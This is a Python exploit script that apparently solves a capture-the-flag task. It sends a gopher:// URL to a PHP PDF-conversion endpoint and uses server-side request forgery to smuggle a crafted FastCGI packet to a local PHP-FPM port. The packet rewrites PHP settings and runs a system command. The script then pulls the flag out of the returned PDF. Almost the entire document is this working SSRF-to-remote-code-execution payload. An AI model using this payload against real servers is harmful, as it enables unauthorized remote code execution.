import io
import re
import requests
from pypdf import PdfReader

URL = "http://utils.edu.stf/convert.php"
Payload = "gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%06%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH65%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%19SCRIPT_FILENAME/var/www/html/convert.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00A%04%00%3C%3Fphp%20system%28%27/home/rceflag%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00"

def rce_solve():
    from_data = {
            "file": ("", "", "application/octet-stream"),
            "url": (None, Payload),
            }

    try:

        response = requests.post(
                URL, files=from_data, timeout=10
                )
        if response.status_code == 200:
            pdf_file = io.BytesIO(response.content)
            reader = PdfReader(pdf_file)

            extracted_text = ""
            for page in reader.pages:
                text = page.extract_text()
                if text:
                    extracted_text += text + "\n"

            clean_text = extracted_text.strip()

            flag_match = re.search(r"\b[a-fA-F0-9]{32}\b", extracted_text)

            if flag_match:
                print(f"{flag_match.group(0)}")
            else:
                print("-" * 40)
                print(extracted_text.strip())
                print("-" * 40)
        else:
            print(f"Ошибка сервера: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"Ошибка подключения: {e}")
    except Exception as e:
        print(f"Ошибка парсинга PDF: {e}")

if __name__ == "__main__":
    rce_solve()
